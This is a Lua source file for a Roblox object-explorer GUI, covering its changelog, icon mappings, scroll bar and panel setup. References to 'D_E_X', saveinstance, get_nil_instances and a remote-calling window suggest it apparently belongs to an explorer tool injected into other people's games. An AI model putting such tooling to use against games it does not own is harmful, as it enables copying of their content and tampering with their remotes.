		If Modifiable is false, then left-clicking will perform a drag
		selection.

## Updates

- 2013-09-18
	- Fixed explorer icons to match studio explorer.

- 2013-09-14
	- Added GetOption and SetOption bindables.
		- Option: Modifiable; sets whether objects can be modified by the panel.
		- Option: Selectable; sets whether objects can be selected.
	- Slight modification to left-click selection behavior.
	- Improved layout and scaling.

- 2013-09-13
	- Added drag to reparent objects.
		- Left-click to select/deselect object.
		- Left-click and drag unselected object to reparent single object.
		- Left-click and drag selected object to move reparent entire selection.
		- Right-click while dragging to cancel.

- 2013-09-11
	- Added explorer panel header with actions.
		- Added Cut action.
		- Added Copy action.
		- Added Paste action.
		- Added Delete action.
	- Added drag selection.
		- Left-click: Add to selection on drag.
		- Right-click: Add to or remove from selection on drag.
	- Ensured SelectionChanged fires only when the selection actually changes.
	- Added documentation and change log.
	- Fixed thread issue.

- 2013-09-09
	- Added basic multi-selection.
		- Left-click to set selection.
		- Right-click to add to or remove from selection.
	- Removed "Selection" ObjectValue.
		- Added GetSelection BindableFunction.
		- Added SetSelection BindableFunction.
		- Added SelectionChanged BindableEvent.
	- Changed font to SourceSans.

- 2013-08-31
	- Improved GUI sizing based off of `GUI_SIZE` constant.
	- Automatic font size detection.

- 2013-08-27
	- Initial explorer panel.


## Todo

- Sorting
	- by ExplorerOrder
	- by children
	- by name
- Drag objects to reparent

]]

local ENTRY_SIZE = GUI_SIZE + ENTRY_PADDING*2
local ENTRY_BOUND = ENTRY_SIZE + ENTRY_MARGIN
local HEADER_SIZE = ENTRY_SIZE*2

local FONT = 'SourceSans'
local FONT_SIZE do
	local size = {8,9,10,11,12,14,18,24,36,48}
	local s
	local n = math.huge
	for i = 1,#size do
		if size[i] <= GUI_SIZE then
			FONT_SIZE = i - 1
		end
	end
end

local GuiColor = {
	Background      = Color3.new(233/255, 233/255, 233/255);
	Border          = Color3.new(149/255, 149/255, 149/255);
	Selected        = Color3.new( 96/255, 140/255, 211/255);
	BorderSelected  = Color3.new( 86/255, 125/255, 188/255);
	Text            = Color3.new(  0/255,   0/255,   0/255);
	TextDisabled    = Color3.new(128/255, 128/255, 128/255);
	TextSelected    = Color3.new(255/255, 255/255, 255/255);
	Button          = Color3.new(221/255, 221/255, 221/255);
	ButtonBorder    = Color3.new(149/255, 149/255, 149/255);
	ButtonSelected  = Color3.new(255/255,   0/255,   0/255);
	Field           = Color3.new(255/255, 255/255, 255/255);
	FieldBorder     = Color3.new(191/255, 191/255, 191/255);
	TitleBackground = Color3.new(178/255, 178/255, 178/255);
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Icon map constants

local MAP_ID = 483448923

-- Indices based on implementation of Icon function.
local ACTION_CUT         	 = 160
local ACTION_COPY        	 = 161
local ACTION_PASTE       	 = 162
local ACTION_DELETE      	 = 163
local ACTION_SORT        	 = 164
local ACTION_CUT_OVER    	 = 174
local ACTION_COPY_OVER   	 = 175
local ACTION_PASTE_OVER  	 = 176
local ACTION_DELETE_OVER	 = 177
local ACTION_SORT_OVER  	 = 178
local ACTION_EDITQUICKACCESS = 190
local ACTION_FREEZE 		 = 188
local ACTION_STARRED 		 = 189
local ACTION_ADDSTAR 		 = 184
local ACTION_ADDSTAR_OVER 	 = 187

local NODE_COLLAPSED      = 165
local NODE_EXPANDED       = 166
local NODE_COLLAPSED_OVER = 179
local NODE_EXPANDED_OVER  = 180

local ExplorerIndex = {
	["Accessory"] = 32;
	["Accoutrement"] = 32;
	["AdService"] = 73;
	["Animation"] = 60;
	["AnimationController"] = 60;
	["AnimationTrack"] = 60;
	["Animator"] = 60;
	["ArcHandles"] = 56;
	["AssetService"] = 72;
	["Attachment"] = 34;
	["Backpack"] = 20;
	["BadgeService"] = 75;
	["BallSocketConstraint"] = 89;
	["BillboardGui"] = 64;
	["BinaryStringValue"] = 4;
	["BindableEvent"] = 67;
	["BindableFunction"] = 66;
	["BlockMesh"] = 8;
	["BloomEffect"] = 90;
	["BlurEffect"] = 90;
	["BodyAngularVelocity"] = 14;
	["BodyForce"] = 14;
	["BodyGyro"] = 14;
	["BodyPosition"] = 14;
	["BodyThrust"] = 14;
	["BodyVelocity"] = 14;
	["BoolValue"] = 4;
	["BoxHandleAdornment"] = 54;
	["BrickColorValue"] = 4;
	["Camera"] = 5;
	["CFrameValue"] = 4;
	["CharacterMesh"] = 60;
	["Chat"] = 33;
	["ClickDetector"] = 41;
	["CollectionService"] = 30;
	["Color3Value"] = 4;
	["ColorCorrectionEffect"] = 90;
	["ConeHandleAdornment"] = 54;
	["Configuration"] = 58;
	["ContentProvider"] = 72;
	["ContextActionService"] = 41;
	["CoreGui"] = 46;
	["CoreScript"] = 18;
	["CornerWedgePart"] = 1;
	["CustomEvent"] = 4;
	["CustomEventReceiver"] = 4;
	["CylinderHandleAdornment"] = 54;
	["CylinderMesh"] = 8;
	["CylindricalConstraint"] = 89;
	["Debris"] = 30;
	["Decal"] = 7;
	["Dialog"] = 62;
	["DialogChoice"] = 63;
	["DoubleConstrainedValue"] = 4;
	["Explosion"] = 36;
	["FileMesh"] = 8;
	["Fire"] = 61;
	["Flag"] = 38;
	["FlagStand"] = 39;
	["FloorWire"] = 4;
	["Folder"] = 70;
	["ForceField"] = 37;
	["Frame"] = 48;
	["GamePassService"] = 19;
	["Glue"] = 34;
	["GuiButton"] = 52;
	["GuiMain"] = 47;
	["GuiService"] = 47;
	["Handles"] = 53;
	["HapticService"] = 84;
	["Hat"] = 45;
	["HingeConstraint"] = 89;
	["Hint"] = 33;
	["HopperBin"] = 22;
	["HttpService"] = 76;
	["Humanoid"] = 9;
	["ImageButton"] = 52;
	["ImageLabel"] = 49;
	["InsertService"] = 72;
	["IntConstrainedValue"] = 4;
	["IntValue"] = 4;
	["JointInstance"] = 34;
	["JointsService"] = 34;
	["Keyframe"] = 60;
	["KeyframeSequence"] = 60;
	["KeyframeSequenceProvider"] = 60;
	["Lighting"] = 13;
	["LineHandleAdornment"] = 54;
	["LocalScript"] = 18;
	["LogService"] = 87;
	["MarketplaceService"] = 46;
	["Message"] = 33;
	["Model"] = 2;
	["ModuleScript"] = 71;
	["Motor"] = 34;
	["Motor6D"] = 34;
	["MoveToConstraint"] = 89;
	["NegateOperation"] = 78;
	["NetworkClient"] = 16;
	["NetworkReplicator"] = 29;
	["NetworkServer"] = 15;
	["NumberValue"] = 4;
	["ObjectValue"] = 4;
	["Pants"] = 44;
	["ParallelRampPart"] = 1;
	["Part"] = 1;
	["ParticleEmitter"] = 69;
	["PartPairLasso"] = 57;
	["PathfindingService"] = 37;
	["Platform"] = 35;
	["Player"] = 12;
	["PlayerGui"] = 46;
	["Players"] = 21;
	["PlayerScripts"] = 82;
	["PointLight"] = 13;
	["PointsService"] = 83;
	["Pose"] = 60;
	["PrismaticConstraint"] = 89;
	["PrismPart"] = 1;
	["PyramidPart"] = 1;
	["RayValue"] = 4;
	["ReflectionMetadata"] = 86;
	["ReflectionMetadataCallbacks"] = 86;
	["ReflectionMetadataClass"] = 86;
	["ReflectionMetadataClasses"] = 86;
	["ReflectionMetadataEnum"] = 86;
	["ReflectionMetadataEnumItem"] = 86;
	["ReflectionMetadataEnums"] = 86;
	["ReflectionMetadataEvents"] = 86;
	["ReflectionMetadataFunctions"] = 86;
	["ReflectionMetadataMember"] = 86;
	["ReflectionMetadataProperties"] = 86;
	["ReflectionMetadataYieldFunctions"] = 86;
	["RemoteEvent"] = 80;
	["RemoteFunction"] = 79;
	["ReplicatedFirst"] = 72;
	["ReplicatedStorage"] = 72;
	["RightAngleRampPart"] = 1;
	["RocketPropulsion"] = 14;
	["RodConstraint"] = 89;
	["RopeConstraint"] = 89;
	["Rotate"] = 34;
	["RotateP"] = 34;
	["RotateV"] = 34;
	["RunService"] = 66;
	["ScreenGui"] = 47;
	["Script"] = 6;
	["ScrollingFrame"] = 48;
	["Seat"] = 35;
	["Selection"] = 55;
	["SelectionBox"] = 54;
	["SelectionPartLasso"] = 57;
	["SelectionPointLasso"] = 57;
	["SelectionSphere"] = 54;
	["ServerScriptService"] = 0;
	["ServerStorage"] = 74;
	["Shirt"] = 43;
	["ShirtGraphic"] = 40;
	["SkateboardPlatform"] = 35;
	["Sky"] = 28;
	["SlidingBallConstraint"] = 89;
	["Smoke"] = 59;
	["Snap"] = 34;
	["Sound"] = 11;
	["SoundService"] = 31;
	["Sparkles"] = 42;
	["SpawnLocation"] = 25;
	["SpecialMesh"] = 8;
	["SphereHandleAdornment"] = 54;
	["SpotLight"] = 13;
	["SpringConstraint"] = 89;
	["StarterCharacterScripts"] = 82;
	["StarterGear"] = 20;
	["StarterGui"] = 46;
	["StarterPack"] = 20;
	["StarterPlayer"] = 88;
	["StarterPlayerScripts"] = 82;
	["Status"] = 2;
	["StringValue"] = 4;
	["SunRaysEffect"] = 90;
	["SurfaceGui"] = 64;
	["SurfaceLight"] = 13;
	["SurfaceSelection"] = 55;
	["Team"] = 24;
	["Teams"] = 23;
	["TeleportService"] = 81;
	["Terrain"] = 65;
	["TerrainRegion"] = 65;
	["TestService"] = 68;
	["TextBox"] = 51;
	["TextButton"] = 51;
	["TextLabel"] = 50;
	["Texture"] = 10;
	["TextureTrail"] = 4;
	["Tool"] = 17;
	["TouchTransmitter"] = 37;
	["TrussPart"] = 1;
	["UnionOperation"] = 77;
	["UserInputService"] = 84;
	["Vector3Value"] = 4;
	["VehicleSeat"] = 35;
	["VelocityMotor"] = 34;
	["WedgePart"] = 1;
	["Weld"] = 34;
	["Workspace"] = 19;
}

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------

function Create(ty,data)
	local obj
	if type(ty) == 'string' then
		obj = Instance.new(ty)
	else
		obj = ty
	end
	for k, v in pairs(data) do
		if type(k) == 'number' then
			v.Parent = obj
		else
			obj[k] = v
		end
	end
	return obj
end

local barActive = false
local activeOptions = {}

function createDDown(dBut, callback,...)
	if barActive then
		for i,v in pairs(activeOptions) do
			v:Destroy()
		end
		activeOptions = {}
		barActive = false
		return
	else
		barActive = true
	end
	local slots = {...}
	local base = dBut
	for i,v in pairs(slots) do
		local newOption = base:Clone()
		newOption.ZIndex = 5
		newOption.Name = "Option "..tostring(i)
		newOption.Parent = base.Parent.Parent.Parent
		newOption.BackgroundTransparency = 0
		newOption.ZIndex = 2
		table.insert(activeOptions,newOption)
		newOption.Position = UDim2.new(-0.4, dBut.Position.X.Offset, dBut.Position.Y.Scale, dBut.Position.Y.Offset + (#activeOptions * dBut.Size.Y.Offset))
		newOption.Text = slots[i]
		newOption.MouseButton1Down:connect(function()
			dBut.Text = slots[i]
			callback(slots[i])
			for i,v in pairs(activeOptions) do
				v:Destroy()
			end
			activeOptions = {}
			barActive = false
		end)
	end
end

-- Connects a function to an event such that it fires asynchronously
function Connect(event,func)
	return event:connect(function(...)
		local a = {...}
		spawn(function() func(unpack(a)) end)
	end)
end

-- returns the ascendant ScreenGui of an object
function GetScreen(screen)
	if screen == nil then return nil end
	while not screen:IsA("ScreenGui") do
		screen = screen.Parent
		if screen == nil then return nil end
	end
	return screen
end

do
	local ZIndexLock = {}
	-- Sets the ZIndex of an object and its descendants. Objects are locked so
	-- that SetZIndexOnChanged doesn't spawn multiple threads that set the
	-- ZIndex of the same object.
	function SetZIndex(object,z)
		if not ZIndexLock[object] then
			ZIndexLock[object] = true
			if object:IsA'GuiObject' then
				object.ZIndex = z
			end
			local children = object:GetChildren()
			for i = 1,#children do
				SetZIndex(children[i],z)
			end
			ZIndexLock[object] = nil
		end
	end

	function SetZIndexOnChanged(object)
		return object.Changed:connect(function(p)
			if p == "ZIndex" then
				SetZIndex(object,object.ZIndex)
			end
		end)
	end
end

---- IconMap ----
-- Image size: 256px x 256px
-- Icon size: 16px x 16px
-- Padding between each icon: 2px
-- Padding around image edge: 1px
-- Total icons: 14 x 14 (196)
local Icon do
	local iconMap = 'http://www.roblox.com/asset/?id=' .. MAP_ID
	game:GetService('ContentProvider'):Preload(iconMap)
	local iconDehash do
		-- 14 x 14, 0-based input, 0-based output
		local f=math.floor
		function iconDehash(h)
			return f(h/14%14),f(h%14)
		end
	end

	function Icon(IconFrame,index)
		local row,col = iconDehash(index)
		local mapSize = Vector2.new(256,256)
		local pad,border = 2,1
		local iconSize = 16

		local class = 'Frame'
		if type(IconFrame) == 'string' then
			class = IconFrame
			IconFrame = nil
		end

		if not IconFrame then
			IconFrame = Create(class,{
				Name = "Icon";
				BackgroundTransparency = 1;
				ClipsDescendants = true;
				Create('ImageLabel',{
					Name = "IconMap";
					Active = false;
					BackgroundTransparency = 1;
					Image = iconMap;
					Size = UDim2.new(mapSize.x/iconSize,0,mapSize.y/iconSize,0);
				});
			})
		end

		IconFrame.IconMap.Position = UDim2.new(-col - (pad*(col+1) + border)/iconSize,0,-row - (pad*(row+1) + border)/iconSize,0)
		return IconFrame
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- ScrollBar
do
	-- AutoButtonColor doesn't always reset properly
	local function ResetButtonColor(button)
		local active = button.Active
		button.Active = not active
		button.Active = active
	end

	local function ArrowGraphic(size,dir,scaled,template)
		local Frame = Create('Frame',{
			Name = "Arrow Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size,0,size);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		local transform
		if dir == nil or dir == 'Up' then
			function transform(p,s) return p,s end
		elseif dir == 'Down' then
			function transform(p,s) return UDim2.new(0,p.X.Offset,0,size-p.Y.Offset-1),s end
		elseif dir == 'Left' then
			function transform(p,s) return UDim2.new(0,p.Y.Offset,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		elseif dir == 'Right' then
			function transform(p,s) return UDim2.new(0,size-p.Y.Offset-1,0,p.X.Offset),UDim2.new(0,s.Y.Offset,0,s.X.Offset) end
		end

		local scale
		if scaled then
			function scale(p,s) return UDim2.new(p.X.Offset/size,0,p.Y.Offset/size,0),UDim2.new(s.X.Offset/size,0,s.Y.Offset/size,0) end
		else
			function scale(p,s) return p,s end
		end

		local o = math.floor(size/4)
		if size%2 == 0 then
			local n = size/2-1
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,(i+1)*2,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		else
			local n = (size-1)/2
			for i = 0,n do
				local t = template:Clone()
				local p,s = scale(transform(
					UDim2.new(0,n-i,0,o+i),
					UDim2.new(0,i*2+1,0,1)
				))
				t.Position = p
				t.Size = s
				t.Parent = Frame
			end
		end
		if size%4 > 1 then
			local t = template:Clone()
			local p,s = scale(transform(
				UDim2.new(0,0,0,size-o-1),
				UDim2.new(0,size,0,1)
			))
			t.Position = p
			t.Size = s
			t.Parent = Frame
		end
		return Frame
	end


	local function GripGraphic(size,dir,spacing,scaled,template)
		local Frame = Create('Frame',{
			Name = "Grip Graphic";
			BorderSizePixel = 0;
			Size = UDim2.new(0,size.x,0,size.y);
			Transparency = 1;
		})
		if not template then
			template = Instance.new("Frame")
			template.BorderSizePixel = 0
		end

		spacing = spacing or 2

		local scale
		if scaled then
			function scale(p) return UDim2.new(p.X.Offset/size.x,0,p.Y.Offset/size.y,0) end
		else
			function scale(p) return p end
		end

		if dir == 'Vertical' then
			for i=0,size.x-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,1,0,size.y))
				t.Position = scale(UDim2.new(0,i,0,0))
				t.Parent = Frame
			end
		elseif dir == nil or dir == 'Horizontal' then
			for i=0,size.y-1,spacing do
				local t = template:Clone()
				t.Size = scale(UDim2.new(0,size.x,0,1))
				t.Position = scale(UDim2.new(0,0,0,i))
				t.Parent = Frame
			end
		end

		return Frame
	end

	local mt = {
		__index = {
			GetScrollPercent = function(self)
				return self.ScrollIndex/(self.TotalSpace-self.VisibleSpace)
			end;
			CanScrollDown = function(self)
				return self.ScrollIndex + self.VisibleSpace < self.TotalSpace
			end;
			CanScrollUp = function(self)
				return self.ScrollIndex > 0
			end;
			ScrollDown = function(self)
				self.ScrollIndex = self.ScrollIndex + self.PageIncrement
				self:Update()
			end;
			ScrollUp = function(self)
				self.ScrollIndex = self.ScrollIndex - self.PageIncrement
				self:Update()
			end;
			ScrollTo = function(self,index)
				self.ScrollIndex = index
				self:Update()
			end;
			SetScrollPercent = function(self,percent)
				self.ScrollIndex = math.floor((self.TotalSpace - self.VisibleSpace)*percent + 0.5)
				self:Update()
			end;
		};
	}
	mt.__index.CanScrollRight = mt.__index.CanScrollDown
	mt.__index.CanScrollLeft = mt.__index.CanScrollUp
	mt.__index.ScrollLeft = mt.__index.ScrollUp
	mt.__index.ScrollRight = mt.__index.ScrollDown

	function ScrollBar(horizontal)
		-- create row scroll bar
		local ScrollFrame = Create('Frame',{
			Name = "ScrollFrame";
			Position = horizontal and UDim2.new(0,0,1,-GUI_SIZE) or UDim2.new(1,-GUI_SIZE,0,0);
			Size = horizontal and UDim2.new(1,0,0,GUI_SIZE) or UDim2.new(0,GUI_SIZE,1,0);
			BackgroundTransparency = 1;
			Create('ImageButton',{
				Name = "ScrollDown";
				Position = horizontal and UDim2.new(1,-GUI_SIZE,0,0) or UDim2.new(0,0,1,-GUI_SIZE);
				Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
				BackgroundColor3 = GuiColor.Button;
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollUp";
				Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
				BackgroundColor3 = GuiColor.Button;
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
			});
			Create('ImageButton',{
				Name = "ScrollBar";
				Size = horizontal and UDim2.new(1,-GUI_SIZE*2,1,0) or UDim2.new(1,0,1,-GUI_SIZE*2);
				Position = horizontal and UDim2.new(0,GUI_SIZE,0,0) or UDim2.new(0,0,0,GUI_SIZE);
				AutoButtonColor = false;
				BackgroundColor3 = Color3.new(0.94902, 0.94902, 0.94902);
				BorderColor3 = GuiColor.Border;
				--BorderSizePixel = 0;
				Create('ImageButton',{
					Name = "ScrollThumb";
					AutoButtonColor = false;
					Size = UDim2.new(0, GUI_SIZE, 0, GUI_SIZE);
					BackgroundColor3 = GuiColor.Button;
					BorderColor3 = GuiColor.Border;
					--BorderSizePixel = 0;
				});
			});
		})

		local graphicTemplate = Create('Frame',{
			Name="Graphic";
			BorderSizePixel = 0;
			BackgroundColor3 = GuiColor.Border;
		})
		local graphicSize = GUI_SIZE/2

		local ScrollDownFrame = ScrollFrame.ScrollDown
			local ScrollDownGraphic = ArrowGraphic(graphicSize,horizontal and 'Right' or 'Down',true,graphicTemplate)
			ScrollDownGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollDownGraphic.Parent = ScrollDownFrame
		local ScrollUpFrame = ScrollFrame.ScrollUp
			local ScrollUpGraphic = ArrowGraphic(graphicSize,horizontal and 'Left' or 'Up',true,graphicTemplate)
			ScrollUpGraphic.Position = UDim2.new(0.5,-graphicSize/2,0.5,-graphicSize/2)
			ScrollUpGraphic.Parent = ScrollUpFrame
		local ScrollBarFrame = ScrollFrame.ScrollBar
		local ScrollThumbFrame = ScrollBarFrame.ScrollThumb
		do
			local size = GUI_SIZE*3/8
			local Decal = GripGraphic(Vector2.new(size,size),horizontal and 'Vertical' or 'Horizontal',2,graphicTemplate)
			Decal.Position = UDim2.new(0.5,-size/2,0.5,-size/2)
			Decal.Parent = ScrollThumbFrame
		end

		local Class = setmetatable({
			GUI = ScrollFrame;
			ScrollIndex = 0;
			VisibleSpace = 0;
			TotalSpace = 0;
			PageIncrement = 1;
		},mt)

		local UpdateScrollThumb
		if horizontal then
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(Class.VisibleSpace/Class.TotalSpace,0,0,GUI_SIZE)
				if ScrollThumbFrame.AbsoluteSize.x < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.x
				ScrollThumbFrame.Position = UDim2.new(Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.x)/barSize,0,0,0)
			end
		else
			function UpdateScrollThumb()
				ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,Class.VisibleSpace/Class.TotalSpace,0)
				if ScrollThumbFrame.AbsoluteSize.y < GUI_SIZE then
					ScrollThumbFrame.Size = UDim2.new(0,GUI_SIZE,0,GUI_SIZE)
				end
				local barSize = ScrollBarFrame.AbsoluteSize.y
				ScrollThumbFrame.Position = UDim2.new(0,0,Class:GetScrollPercent()*(barSize - ScrollThumbFrame.AbsoluteSize.y)/barSize,0)
			end
		end

		local lastDown
		local lastUp
		local scrollStyle = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0}
		local scrollStyle_ds = {BackgroundColor3=GuiColor.Border,BackgroundTransparency=0.7}

		local function Update()
			local t = Class.TotalSpace
			local v = Class.VisibleSpace
			local s = Class.ScrollIndex
			if v <= t then
				if s > 0 then
					if s + v > t then
						Class.ScrollIndex = t - v
					end
				else
					Class.ScrollIndex = 0
				end
			else
				Class.ScrollIndex = 0
			end

			if Class.UpdateCallback then
				if Class.UpdateCallback(Class) == false then
					return
				end
			end

			local down = Class:CanScrollDown()
			local up = Class:CanScrollUp()
			if down ~= lastDown then
				lastDown = down
				ScrollDownFrame.Active = down
				ScrollDownFrame.AutoButtonColor = down
				local children = ScrollDownGraphic:GetChildren()
				local style = down and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			if up ~= lastUp then
				lastUp = up
				ScrollUpFrame.Active = up
				ScrollUpFrame.AutoButtonColor = up
				local children = ScrollUpGraphic:GetChildren()
				local style = up and scrollStyle or scrollStyle_ds
				for i = 1,#children do
					Create(children[i],style)
				end
			end
			ScrollThumbFrame.Visible = down or up
			UpdateScrollThumb()
		end
		Class.Update = Update

		SetZIndexOnChanged(ScrollFrame)

		local MouseDrag = Create('ImageButton',{
			Name = "MouseDrag";
			Position = UDim2.new(-0.25,0,-0.25,0);
			Size = UDim2.new(1.5,0,1.5,0);
			Transparency = 1;
			AutoButtonColor = false;
			Active = true;
			ZIndex = 10;
		})

		local scrollEventID = 0
		ScrollDownFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollDownFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollDown()
			wait(0.2) -- delay before auto scroll
			while scrollEventID == current do
				Class:ScrollDown()
				if not Class:CanScrollDown() then break end
				wait()
			end
		end)

		ScrollDownFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		ScrollUpFrame.MouseButton1Down:connect(function()
			scrollEventID = tick()
			local current = scrollEventID
			local up_con
			up_con = MouseDrag.MouseButton1Up:connect(function()
				scrollEventID = tick()
				MouseDrag.Parent = nil
				ResetButtonColor(ScrollUpFrame)
				up_con:disconnect(); drag = nil
			end)
			MouseDrag.Parent = GetScreen(ScrollFrame)
			Class:ScrollUp()
			wait(0.2)
			while scrollEventID == current do
				Class:ScrollUp()
				if not Class:CanScrollUp() then break end
				wait()
			end
		end)

		ScrollUpFrame.MouseButton1Up:connect(function()
			scrollEventID = tick()
		end)

		if horizontal then
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if x > ScrollThumbFrame.AbsolutePosition.x then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x < ScrollThumbFrame.AbsolutePosition.x + ScrollThumbFrame.AbsoluteSize.x then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if x > ScrollThumbFrame.AbsolutePosition.x then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		else
			ScrollBarFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local current = scrollEventID
				local up_con
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollUpFrame)
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
				if y > ScrollThumbFrame.AbsolutePosition.y then
					Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y < ScrollThumbFrame.AbsolutePosition.y + ScrollThumbFrame.AbsoluteSize.y then break end
						Class:ScrollTo(Class.ScrollIndex + Class.VisibleSpace)
						wait()
					end
				else
					Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
					wait(0.2)
					while scrollEventID == current do
						if y > ScrollThumbFrame.AbsolutePosition.y then break end
						Class:ScrollTo(Class.ScrollIndex - Class.VisibleSpace)
						wait()
					end
				end
			end)
		end

		if horizontal then
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = x - ScrollThumbFrame.AbsolutePosition.x
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.x
					local bar_drag = ScrollBarFrame.AbsoluteSize.x - ScrollThumbFrame.AbsoluteSize.x
					local bar_abs_one = bar_abs_pos + bar_drag
					x = x - mouse_offset
					x = x < bar_abs_pos and bar_abs_pos or x > bar_abs_one and bar_abs_one or x
					x = x - bar_abs_pos
					Class:SetScrollPercent(x/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		else
			ScrollThumbFrame.MouseButton1Down:connect(function(x,y)
				scrollEventID = tick()
				local mouse_offset = y - ScrollThumbFrame.AbsolutePosition.y
				local drag_con
				local up_con
				drag_con = MouseDrag.MouseMoved:connect(function(x,y)
					local bar_abs_pos = ScrollBarFrame.AbsolutePosition.y
					local bar_drag = ScrollBarFrame.AbsoluteSize.y - ScrollThumbFrame.AbsoluteSize.y
					local bar_abs_one = bar_abs_pos + bar_drag
					y = y - mouse_offset
					y = y < bar_abs_pos and bar_abs_pos or y > bar_abs_one and bar_abs_one or y
					y = y - bar_abs_pos
					Class:SetScrollPercent(y/(bar_drag))
				end)
				up_con = MouseDrag.MouseButton1Up:connect(function()
					scrollEventID = tick()
					MouseDrag.Parent = nil
					ResetButtonColor(ScrollThumbFrame)
					drag_con:disconnect(); drag_con = nil
					up_con:disconnect(); drag = nil
				end)
				MouseDrag.Parent = GetScreen(ScrollFrame)
			end)
		end

		function Class:Destroy()
			ScrollFrame:Destroy()
			MouseDrag:Destroy()
			for k in pairs(Class) do
				Class[k] = nil
			end
			setmetatable(Class,nil)
		end

		Update()

		return Class
	end
end

----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
----------------------------------------------------------------
---- Explorer panel

local explorerPanel = D_E_X.ExplorerPanel
Create(explorerPanel,{
	BackgroundColor3 = GuiColor.Field;
	BorderColor3 = GuiColor.Border;
	Active = true;
})

local SettingsRemote = explorerPanel.Parent:WaitForChild("SettingsPanel"):WaitForChild("GetSetting")
local GetApiRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetApi")
local GetAwaitRemote = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("GetAwaiting")
local bindSetAwaiting = explorerPanel.Parent:WaitForChild("PropertiesFrame"):WaitForChild("SetAwaiting")

local SaveInstanceWindow = explorerPanel.Parent:WaitForChild("SaveInstance")
local ConfirmationWindow = explorerPanel.Parent:WaitForChild("Confirmation")
local CautionWindow = explorerPanel.Parent:WaitForChild("Caution")
local TableCautionWindow = explorerPanel.Parent:WaitForChild("TableCaution")

local RemoteWindow = explorerPanel.Parent:WaitForChild("CallRemote")

local ScriptEditor = explorerPanel.Parent:WaitForChild("ScriptEditor")
local ScriptEditorEvent = ScriptEditor:WaitForChild("OpenScript")

local CurrentSaveInstanceWindow
local CurrentRemoteWindow

local lastSelectedNode

local DexStorage
local DexStorageMain
local DexStorageEnabled

if saveinstance then DexStorageEnabled = true end

if DexStorageEnabled then
	DexStorage = Instance.new("Folder")
	DexStorage.Name = "Dex"
	DexStorageMain = Instance.new("Folder",DexStorage)
	DexStorageMain.Name = "DexStorage"
end

local NilStorage
local NilStorageMain
local NilStorageEnabled

if get_nil_instances and IfThisFunctionWasStableEnough then NilStorageEnabled = true end

if NilStorageEnabled then
	NilStorage = Instance.new("Folder")
	NilStorage.Name = "Dex Internal Storage"
	NilStorageMain = Instance.new("Folder",NilStorage)
	NilStorageMain.Name = "Nil Instances"
end

local listFrame = Create('Frame',{
	Name = "List";
	BackgroundTransparency = 1;
	ClipsDescendants = true;
	Position = UDim2.new(0,0,0,HEADER_SIZE);
